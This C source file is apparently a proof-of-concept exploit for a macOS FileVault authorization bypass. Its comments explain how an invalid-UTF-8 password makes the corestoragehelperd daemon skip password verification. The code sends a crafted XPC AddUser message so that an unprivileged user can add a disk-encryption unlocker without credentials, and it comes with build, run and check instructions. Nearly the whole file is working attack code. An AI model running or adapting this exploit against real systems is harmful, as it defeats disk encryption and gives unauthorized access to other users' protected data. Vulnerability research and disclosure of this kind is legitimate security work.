// corestoragehelperd_adduser_bypass.c — uid501 credential-free FileVault-unlocker-add bypass PoC.
// Bug (26A5368g, statically proven): com.apple.corestorage.corestoragehelperd has NO caller auth;
// AddUser's ODRecordVerifyPassword is SKIPPED when authpass CFString is NULL (cbz @0x100001c90),
// authpass becomes NULL via invalid-UTF-8 bytes (CFStringCreateWithCString→NULL), and the verify
// result never gates CSFDEAddOSUserEntry (reserve-KEK fallback @0x100002158/0x100001e48).
// => uid501 with ZERO FDE creds requests adding an FDE unlocker.
// *** REQUIRES FileVault ON to exercise the CoreStorage path (FV OFF => daemon no-ops {status:false}). ***
// Confirm on a FileVault-ON VM: run as uid501, then `fdesetup list` / check for a new unlocker.
// Build: clang -O2 -o cshbypass corestoragehelperd_adduser_bypass.c
// Run:   ./cshbypass <attacker_shortname>    (defaults to $USER)
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <xpc/xpc.h>
#include <dispatch/dispatch.h>

int main(int argc, char** argv){
  const char* who = (argc>1)?argv[1]:getenv("USER");
  if(!who) who="test";
  printf("[cshbypass] uid=%d attacker_shortname=%s\n", getuid(), who);

  xpc_connection_t c = xpc_connection_create_mach_service(
      "com.apple.corestorage.corestoragehelperd", NULL, 0 /*not privileged*/);
  if(!c){ printf("connect failed\n"); return 1; }
  xpc_connection_set_event_handler(c, ^(xpc_object_t e){
    if(xpc_get_type(e)==XPC_TYPE_ERROR){
      const char* d = xpc_dictionary_get_string(e, XPC_ERROR_KEY_DESCRIPTION);
      printf("[cshbypass] conn event/error: %s\n", d?d:"(err)");
    }
  });
  xpc_connection_resume(c);

  // Build the AddUser bypass dict. authpass/password = invalid-UTF-8 (single 0xFF byte, NUL-terminated)
  // -> CFStringCreateWithCString(kCFStringEncodingUTF8) returns NULL -> verify-skip branch.
  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_string(msg, "op", "AddUser");
  xpc_dictionary_set_string(msg, "authuser", who);
  xpc_dictionary_set_string(msg, "authpass", "\xff");   // invalid UTF-8 -> NULL CFString -> verify skipped
  xpc_dictionary_set_string(msg, "username", who);
  xpc_dictionary_set_string(msg, "password", "\xff");
  // path key is optional; add if a target volume path is needed on the test bed:
  // xpc_dictionary_set_string(msg, "path", "/");

  xpc_object_t reply = xpc_connection_send_message_with_reply_sync(c, msg);
  if(reply && xpc_get_type(reply)==XPC_TYPE_DICTIONARY){
    bool st = xpc_dictionary_get_bool(reply, "status");
    printf("[cshbypass] reply status=%s\n", st?"true":"false");
    char buf[512]; xpc_dictionary_get_string(reply,"error") ;
    const char* err = xpc_dictionary_get_string(reply,"error");
    if(err) printf("[cshbypass] error=%s\n", err);
    printf("[cshbypass] (FV OFF => expect status:false no-op; FV ON + bypass working => unlocker added — verify with `fdesetup list`)\n");
    (void)buf;
  } else {
    printf("[cshbypass] no dict reply (type=%p)\n",(void*)reply);
  }
  return 0;
}
